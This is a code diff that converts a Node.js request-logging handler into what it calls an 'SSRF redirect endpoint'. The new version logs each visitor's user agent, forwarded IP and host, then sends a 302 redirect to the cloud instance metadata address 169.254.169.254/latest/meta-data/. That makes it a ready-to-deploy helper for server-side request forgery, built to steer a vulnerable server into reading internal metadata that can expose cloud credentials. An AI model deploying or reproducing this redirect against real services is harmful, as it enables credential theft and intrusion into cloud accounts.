@@ -1,19 +1,13 @@
 module.exports = (req, res) => {
-    console.log('============================');
-    console.log('Время:', new Date().toISOString());
+  console.log("Incoming request to SSRF redirect endpoint");
+  console.log("UA:", req.headers["user-agent"]);
+  console.log("IP:", req.headers["x-forwarded-for"]);
+  console.log("Host:", req.headers["host"]);
 
-    // Полный URL
-    console.log('URL:', req.url);
-
-    // Query string в виде объекта
-    console.log('Query params:', req.query);
-
-    // Headers
-    console.log('User-Agent:', req.headers['user-agent']);
-    console.log('Referer:', req.headers['referer']);
-    console.log('Origin:', req.headers['origin']);
-
-    res.statusCode = 200;
-    res.setHeader('Content-Type', 'text/plain');
-    res.end('OK');
+  res.statusCode = 302;
+  res.setHeader(
+    "Location",
+    "http://169.254.169.254/latest/meta-data/"
+  );
+  res.end("Redirecting...");
 };
